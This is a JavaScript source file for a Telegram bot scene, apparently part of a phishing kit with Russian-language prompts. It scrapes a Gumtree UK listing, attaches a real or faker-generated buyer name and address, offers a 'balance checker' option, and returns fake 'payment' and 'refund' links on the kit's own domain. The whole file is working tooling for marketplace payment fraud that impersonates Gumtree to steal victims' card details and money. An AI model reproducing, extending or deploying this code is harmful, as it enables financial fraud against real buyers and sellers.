const WizardScene = require("telegraf/scenes/wizard");
const { Request, Ad, Service } = require("../../database");
const locale = require("../../locale");
const escapeHTML = require("escape-html");
const { Markup } = require("telegraf");
const log = require("../../helpers/log");
const cheerio = require("cheerio");
const { default: axios } = require("axios");
const rand = require("../../helpers/rand");
const menu = require("../../commands/menu");

const faker = require("faker/locale/en");

const gumtree_uk_domains = ["www.gumtree.com", "gumtree.com"];

const scene = new WizardScene(
  "create_link_gumtree_uk",
  async (ctx) => {
    try {
      const service = await Service.findOne({
        where: {
          code: "gumtree_uk",
        },
      });
      if (!service) {
        await ctx.scene.reply("❌ Сервис не существует").catch((err) => err);
        return ctx.scene.leave();
      }
      log(ctx, "перешёл к созданию ссылки GUMTREE.UK");
      return ctx.wizard.nextStep();
    } catch (err) {
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      await ctx.scene.reply("Отправьте ссылку на объявление GUMTREE.UK", {
        reply_markup: Markup.inlineKeyboard([
          [Markup.callbackButton("Отменить", "cancel")],
        ]),
      });
      ctx.scene.state.data = {};
      return ctx.wizard.next();
    } catch (err) {
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      if (!ctx.message?.text) return ctx.wizard.prevStep();
      var url;
      try {
        url = new URL(ctx.message.text);
      } catch (err) {
        await ctx.replyOrEdit("❌ Введите валидную ссылку").catch((err) => err);
        return ctx.wizard.prevStep();
      }
      if (!gumtree_uk_domains.includes(url.host)) {
        await ctx
          .replyOrEdit("❌ Введите ссылку на объявление GUMTREE.UK")
          .catch((err) => err);
        return ctx.wizard.prevStep();
      }
      log(ctx, `отправил ссылку для парсинга GUMTREE.UK (${url.href})`);

      await ctx.scene.reply("🔄 Парсим объявление...").catch((err) => err);
      const ad = await axios.get(encodeURI(url.href)),
        $ = cheerio.load(ad.data);

      const info = {
        title: $("[itemprop='name']").first().text().trim(),
        price: $(".ad-price").first().text().trim(),
        adLink: url.href,
      };
      try {
        info.photo = $("[property='og:image']").attr("content");
      } catch (err) {}

      if (!info.title || !info.price) {
        await ctx.scene
          .reply("❌ Не удалось спарсить объявление")
          .catch((err) => err);
        return ctx.scene.leave();
      }
      log(ctx, `спарсил объявление GUMTREE.UK (${url.href})`);
      ctx.scene.state.data = info;
      var text = `✅ Объявление спарсилось!

Название: <b>${escapeHTML(info.title)}</b>
Цена: <b>${escapeHTML(info.price)}</b>`;

      if (info.photo)
        await ctx
          .replyWithPhoto(
            {
              url: info.photo,
            },
            {
              parse_mode: "HTML",
              caption: text,
            }
          )
          .catch((err) => err);
      else await ctx.reply(text).catch((err) => err);
      return ctx.wizard.nextStep();
    } catch (err) {
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      await ctx.scene
        .reply("Введите имя покупателя (Формат: Имя Фамилия)", {
          reply_markup: Markup.inlineKeyboard([
            [Markup.callbackButton("Автоматическая генерация", "auto")],
            [Markup.callbackButton("Отменить", "cancel")],
          ]),
        })
        .catch((err) => err);
      return ctx.wizard.next();
    } catch (err) {
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      if (!ctx.message?.text && ctx.callbackQuery?.data != "auto")
        return ctx.wizard.prevStep();
      if (ctx.callbackQuery?.data == "auto") {
        ctx.scene.state.data.name = faker.name.findName();
        await ctx
          .reply(
            `🤖 Сгенерированное имя: <b>${ctx.scene.state.data.name}</b>`,
            {
              parse_mode: "HTML",
            }
          )
          .catch((err) => err);
      } else ctx.scene.state.data.name = ctx.message.text;
      return ctx.wizard.nextStep();
    } catch (err) {
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      await ctx.scene
        .reply("Введите адрес покупателя", {
          reply_markup: Markup.inlineKeyboard([
            [Markup.callbackButton("Автоматическая генерация", "auto")],
            [Markup.callbackButton("Отменить", "cancel")],
          ]),
        })
        .catch((err) => err);
      return ctx.wizard.next();
    } catch (err) {
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      if (!ctx.message?.text && ctx.callbackQuery?.data != "auto")
        return ctx.wizard.prevStep();
      if (ctx.callbackQuery?.data == "auto") {
        ctx.scene.state.data.address = `${faker.address.cityName()}, ${faker.address.streetAddress()}`;
        await ctx
          .reply(
            `🤖 Сгенерированный адрес: <b>${ctx.scene.state.data.address}</b>`,
            {
              parse_mode: "HTML",
            }
          )
          .catch((err) => err);
      } else ctx.scene.state.data.address = ctx.message.text;
      return ctx.wizard.nextStep();
    } catch (err) {
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      await ctx.scene
        .reply("Чекер баланса", {
          reply_markup: Markup.inlineKeyboard([
            [
              Markup.callbackButton("Включить", "true"),
              Markup.callbackButton("Выключить", "false"),
            ],
            [Markup.callbackButton("Отменить", "cancel")],
          ]),
        })
        .catch((err) => err);
      return ctx.wizard.next();
    } catch (err) {
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      if (!["true", "false"].includes(ctx.callbackQuery?.data))
        return ctx.wizard.prevStep();
      ctx.scene.state.data.balanceChecker = ctx.callbackQuery.data == "true";
      return ctx.wizard.nextStep();
    } catch (err) {
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      const service = await Service.findOne({
        where: {
          code: "gumtree_uk",
        },
      });
      if (!service) {
        await ctx.scene.reply("❌ Сервис не существует").catch((err) => err);
        return ctx.scene.leave();
      }
      const ad = await Ad.create({
        id: parseInt(rand(999999, 99999999) + new Date().getTime() / 10000),
        userId: ctx.from.id,
        ...ctx.scene.state.data,
        serviceCode: "gumtree_uk",
      });

      log(ctx, `создал объявление GUMTREE.UK <code>(ID: ${ad.id})</code>`);
      await ctx.scene.reply(
        `<b>✅ Ссылка🏴󠁧󠁢󠁥󠁮󠁧󠁿 GUMTREE.UK сгенерирована!</b>
      
🔗 Получение оплаты: <b>https://${service.domain}/${ad.id}</b>
🔗 Возврат: <b>https://${service.domain}/refund/${ad.id}</b>`,
        {
          parse_mode: "HTML",
        }
      );
      ctx.updateType = "message";
    } catch (err) {
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
    }
    return ctx.scene.leave();
  }
);

scene.leave(menu);

module.exports = scene;
